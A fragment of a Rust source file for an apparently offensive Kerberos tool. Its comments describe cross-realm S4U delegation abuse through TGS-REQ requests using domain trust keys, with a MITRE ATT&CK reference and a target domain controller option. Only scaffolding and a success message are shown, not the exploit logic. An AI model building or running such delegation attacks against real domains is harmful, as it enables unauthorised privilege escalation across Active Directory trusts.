...
//!
//! Performs cross-realm S4U delegation abuse via TGS-REQ using trust
//! keys for cross-domain ticket requests.
//!
//! ## MITRE ATT&CK
...
//! - `/targetdc:DC` - Target domain controller
...
fn main(args: *mut u8, len: usize) {
    ...
    match handle_tgs_rep(&api, &response, &kirbi) {
        Some(ticket) => {
            println!("[+] Cross-domain S4U request successful!");
